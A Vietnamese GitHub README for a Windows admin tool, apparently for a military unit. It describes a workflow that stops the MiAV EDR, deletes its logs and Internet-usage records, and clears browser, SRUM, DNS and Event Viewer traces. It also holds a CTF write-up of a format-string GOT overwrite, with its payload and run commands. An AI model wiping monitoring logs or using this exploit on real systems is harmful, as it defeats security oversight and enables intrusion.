# Danny — Trợ lý Công nghệ thông tin (ver5.0)

Phần mềm quản trị máy tính cho đơn vị quân sự, viết bởi **Trung tá Đoàn Danh Quyết**.

| | |
|---|---|
| **Phiên bản hiện tại** | 5.0.0 — [tải tại đây](https://github.com/doandanhquyetqk7/Danny/releases/tag/v5.0.0) |
| **Nền tảng** | .NET 8 / Windows Forms · yêu cầu quyền Administrator |
| **Liên hệ** | 0366.714.139 · Bộ Chỉ huy Quân sự tỉnh Lâm Đồng |
| **Theo dõi phiên bản** | [Projects board — Danny project](https://github.com/users/doandanhquyetqk7/projects/1) |

## Lộ trình phát triển

| Phiên bản | Nội dung | Trạng thái |
|---|---|---|
| **ver5.0** | Bước cuối: tự động cài lại MiAV trước khi reboot | ✅ Đã phát hành — [release](https://github.com/doandanhquyetqk7/Danny/releases/tag/v5.0.0) |
| **ver5.1** | Báo cáo & nhật ký làm sạch tổng hợp theo đơn vị, xuất PDF | 🔵 Ready |
| **ver5.2** | Xác minh chữ ký Authenticode cho bộ phân phối | ⚪ Backlog |
| **ver5.3** | Dashboard trạng thái giám sát EDR (4 service MiAV + driver kernel) | ⚪ Backlog |
| **ver5.4** | Chế độ an toàn "không Internet" cho bước làm sạch (tự ngắt adapter) | ⚪ Backlog |


## Các tab chức năng

| # | Tab | Chức năng |
|---|---|---|
| 1 | **KIỂM TRA KẾT NỐI** | Chẩn đoán 4 bước; tra cứu 130 đơn vị (gõ tiếng Việt có/không dấu); xuất báo cáo |
| 2 | **USB AN TOÀN 2.6** | Tạo USB an toàn cho MiAV — không bị chặn ở tầng kernel; thư mục `DATA` đọc/ghi nhưng chặn chạy `.exe` |
| 3 | **CẤU HÌNH IP MỘT CHẠM** | Đặt IP tĩnh LAN đúng dải đơn vị, có rollback khi lỗi |
| 4 | **CẤU HÌNH MẠNG** | Cấu hình IP/DNS thủ công |
| 5 | **LÀM SẠCH PC MỘT CHẠM** | Xóa log MiAV + artifact Windows → quét KVRT → **cài lại MiAV** → reboot |
| 6 | **BẢO MẬT & TIỆN ÍCH** | Chạy KVRT thủ công, xóa Event Viewer, hiện file ẩn |

## Quy trình “Làm sạch PC một chạm” (ver5.0)

```
 1  Kiểm tra trạng thái Internet           8  Xóa NHÓM B (artifact MiAV)
 2  Kiểm kê dòng Logs type='Internet'     9  Xác minh
 3  Sao lưu AgentFMC                      10  Bật lại 4 service MiAV
 4  Dừng 4 service MiAV                  11  Kaspersky KVRT — quét toàn bộ ổ + khử nhiễm
 5  Dừng tiến trình GUI MiAV             12  ★ Cài lại MiAV (SetupMiAV.exe /VERYSILENT)
 6  Xóa NHÓM A (bảng Logs, policy.*)     13  Báo cáo CSV → Khởi động lại máy
 7  Xóa NHÓM C (browser, SRUM, DNS…)
```

Bước 12 (mới ở ver5.0) gọi `SetupMiAV.exe` với tham số
`/VERYSILENT /SUPPRESSMSGBOXES /SP- /NORESTART /LANG=english /LOG="…"`,
rồi xác minh 4 service `MiAVWD` / `MiAVUpdate` / `MiAVProtect` / `Defense`
đã được tạo.

## Cấu trúc bộ cài

```
Danny-ver5.0/
├── Danny-ver5.0.exe           69,15 MB  ← khuyến nghị (self-contained)
├── Danny-ver5.0-nethost.exe   1,36 MB  ← cần .NET 8 Desktop Runtime
├── tools\KVRT.exe            116,28 MB
├── tools\SetupMiAV.exe        21,20 MB
└── HUONG-DAN-SU-DUNG.md
```

## Mã nguồn

| Đường dẫn | Nội dung |
|---|---|
| `NetSecTool/` | Mã nguồn C# (.NET 8 WinForms) |
| `NetSecTool/PcCleaner.cs` | Engine làm sạch + cài lại MiAV |
| `NetSecTool/UsbSafeMaker.cs`, `UsbFormatter.cs` | Tạo USB an toàn 2.6 |
| `NetSecTool/IpPlan.cs`, `IpNetTable.cs`, `OneClickIpService.cs` | Cấu hình IP một chạm |
| `NetSecTool/NetDiagnostics.cs` | Chẩn đoán kết nối mạng |
| `NetSecTool/UnitSearch.cs`, `UnitSearchBox.cs` | Tìm kiếm đơn vị (bỏ dấu tiếng Việt) |
| `Phan tich MiAV/` | Báo cáo phân tích EDR MiAV 4.1.1.2 + script làm sạch log |
| `report/` | Báo cáo cơ chế MiAV / USB An Toàn (kèm sơ đồ) |
| `evidence/` | Evidence E-001 … E-008 |

## Build

```bash
cd NetSecTool
# self-contained, single-file
dotnet publish -c Release -r win-x64 --self-contained true \
  -p:PublishSingleFile=true -p:IncludeNativeLibrariesForSelfExtract=true \
  -p:EnableCompressionInSingleFile=true -o ../work/pub

# framework-dependent, single-file
dotnet publish -c Release -r win-x64 -p:SelfContained=false \
  -p:PublishSingleFile=true -p:IncludeNativeLibrariesForSelfExtract=true \
  -o ../work/pub-nethost
```

> File nhị phân lớn (`*.exe`, `*.zip`) được lưu bằng **Git LFS** — cần `git lfs install` khi clone.

## CLI

```cmd
Danny-ver5.0.exe --make-safe "J:\"    :: Tạo USB An Toàn 2.6
Danny-ver5.0.exe --check "J:\"        :: Kiểm tra trạng thái USB an toàn
Danny-ver5.0.exe --diag [--full]       :: Kiểm tra kết nối mạng
Danny-ver5.0.exe --clean               :: Làm sạch PC một chạm (kèm cài lại MiAV)
```

---

# Hồ sơ phân tích (reverse engineering)

> Workspace dùng chung cho nhiều case. Phân tích mới nhất nằm ở [`report/report.md`](report/report.md)
> và [`Phan tich MiAV/BAO-CAO-PHAN-TICH-MIAV.md`](Phan%20tich%20MiAV/BAO-CAO-PHAN-TICH-MIAV.md).

## Case hiện tại: MiAV 4.1.1.2 & USB An Toàn 2.6 (BTL86) — cơ chế quản lý USB

> Workspace dùng chung cho nhiều case. Phân tích mới nhất nằm ở [`report/report.md`](report/report.md).

| Mục | Giá trị |
|---|---|
| Loại | Phân tích tĩnh 2 installer Inno Setup (read-only, không thực thi) |
| MiAV 4.1.1.2 | Delphi x86-32 · engine quyết định `@ 0x90ECE0` · khoá bằng minifilter CBFS Filter 2020 |
| USB An Toàn 2.6 | `USB_ATTT.exe` (VB6 native) · format + label `USB-AT2.6` + bộ file chỉ dấu + ACL |
| Kết luận | MiAV là bên **kiểm tra & cưỡng chế**, USB An Toàn là bên **sinh dấu vết**; `config.ini [Drive] usb_no_at = block` là công tắc khóa |

| File | Mô tả |
|---|---|
| `report/report.md` | Báo cáo cơ chế đầy đủ (tiếng Việt) |
| `report/diagrams/*.svg\|pdf\|png` | 5 sơ đồ kiến trúc / luồng quyết định / trạng thái / offset map |
| `evidence/E-001.md` | Định danh, hash, Inno Setup script, layout |
| `evidence/E-002.md` | MiAV: engine quyết định USB, phân loại, khoá kernel, cảnh báo, syslog |
| `evidence/E-004.md` | USB_ATTT.exe: API, quy trình tạo USB, ACL, đối chiếu với MiAV |
| `scope.md`, `workitems.md`, `timeline.md` | Hồ sơ case (pass `review_case.py --strict`) |
| `work/*.py` | Script PE/Delphi/disasm/string/diagram tự viết |

---

## Case trước: CTF pwn GOT overwrite

## Kết quả

| Mục | Giá trị |
|-----|---------|
| Loại | CTF pwn (GOT overwrite) |
| Độ khó | Khó (so với bài Trung bình chỉ lật 1 cờ bool) |
| Binary | `got_overwrite` — ELF 64-bit Linux, no PIE, no RELRO, NX on |
| Hidden func | `thong_bao_bi_mat` @ `0x401216` |
| Target GOT  | `got.strlen` @ `0x403410` |
| Payload     | `%4198934c%8$llna\x10\x34\x40\x00\x00\x00\x00\x00` (24 bytes) |
| Format string offset | **6** (xác nhận bằng Unicorn emulation) |

## Tóm tắt kỹ thuật

`main()` đọc input vào `buf[256]` rồi gọi `printf(buf)` — **format string
vulnerability** cổ điển. Sau đó main gọi `xu_ly_du_lieu(buf)`, hàm này
gọi `strlen(buf)`. Trong binary có một hàm ẩn `thong_bao_bi_mat` đọc
`flag.txt` và in nội dung — hàm này không bao giờ được gọi trong luồng
bình thường.

Vì binary **không PIE** và **không RELRO**, GOT là vùng nhớ tĩnh (0x403xxx)
và có quyền ghi. Payload format string ghi địa chỉ `0x401216` (hàm ẩn)
vào `0x403410` (GOT entry của `strlen`). Lần gọi `strlen` tiếp theo
sẽ nhảy sang hàm ẩn và in flag.

## Các file

| File | Mô tả |
|------|-------|
| `got_overwrite` | Binary gốc (Linux ELF 64-bit) |
| `got_overwrite.bak` | Backup |
| `exploit.py` | Exploit pwntools chính (payload + runner) |
| `inspect_elf.py` | Recon: checksec, symbols, GOT, PLT |
| `disasm2.py` | Disassembly main / xu_ly_du_lieu / thong_bao_bi_mat bằng Capstone |
| `rodata.py` | Dump rodata strings |
| `verify_offset5.py` | **Quan trọng**: xác minh offset=6 bằng Unicorn emulation |
| `work/scope.md` | Scope / authorization |
| `evidence/E-001.md` | Evidence: phân tích tĩnh |
| `evidence/E-002.md` | Evidence: format string offset = 6 (Unicorn) |
| `evidence/E-003.md` | Evidence: payload build |
| `report/report.md` | Báo cáo cuối |

## Cách chạy exploit

Trên máy **Linux** (binary Linux ELF không chạy được trên Windows):

```bash
# Local test với flag.txt giả
echo "CTF{test}" > flag.txt
python3 exploit.py

# Remote (nếu có server)
HOST=ctf.example.com PORT=1337 python3 exploit.py REMOTE
```

Kỳ vọng output: khoảng 4 MB khoảng trắng (từ `%4198934c`) + dòng
`>>> HE THONG DA BI CHIEM QUYEN: <flag content>`.

## Tại sao offset=6?

Trong x86-64 SysV ABI, variadic args 1-5 của printf nằm trong
`rsi, rdx, rcx, r8, r9`. Từ arg thứ 6 trở đi, giá trị được đọc từ
stack của caller, bắt đầu từ `[rsp_tại_call_site + 0]`.

Trong `main`:
- `sub rsp, 0x100` → `rsp = rbp - 0x100`
- `buf` nằm ở `rbp - 0x100`
- Tại lệnh `call printf`: `rsp = rbp - 0x100 = &buf`
- Vậy stack variadic arg 6 = `[rsp + 0] tại call` = `buf[0..7]`

Xác minh bằng `verify_offset5.py` (Unicorn): đặt marker `AAAA` tại
`buf[0..7]`, thay thế printf bằng stub đọc 15 variadic positions.
Stub đọc được `AAAA%6$p` ở **position 6** → offset = 6. ✓

## Tại sao `%lln`?

- `got.strlen` lưu trữ 64-bit pointer (địa chỉ libc của `strlen`)
- Cần ghi toàn bộ 8 byte = 0x0000000000401216
- `%lln` ghi 64-bit (8 byte) — ghi đúng 1 lần, đơn giản nhất
- `%n` (32-bit) cũng được, nhưng chỉ ghi được 4 byte thấp; byte cao
  của GOT entry (0x00007fxx...) sẽ vẫn còn → gọi `strlen` sẽ crash
- `%hn` / `%hhn` cần nhiều lần ghi và phức tạp hơn

## Tại sao `%4198934c`?

- Giá trị cần ghi: 0x401216 = 4,198,934 (decimal)
- `%Nc` yêu cầu printf in N ký tự (padding) → counter của `%n`/%`lln`
  tăng lên N
- Sau `%4198934c`, counter = 4,198,934 = 0x401216
- `%8$lln` ghi counter này (8 bytes) vào địa chỉ ở position 8

## Các lệnh kiểm tra đã chạy

```
$ python inspect_elf.py
  Arch: amd64
  RELRO: No RELRO
  Stack: No canary found
  NX: NX enabled
  PIE:  No PIE (0x400000)
  GOT[strlen] = 0x403410
  thong_bao_bi_mat = 0x401216

$ python verify_offset5.py
  pos  6 (stack[+0]): 0x7024362541414141
  >>> AAAA%6$p at position 6  -> offset = 6 confirmed

$ python exploit.py
  [+] payload length = 24 bytes
  [+] payload hex    = 2534313938393334632538246c6c6e611034400000000000
```
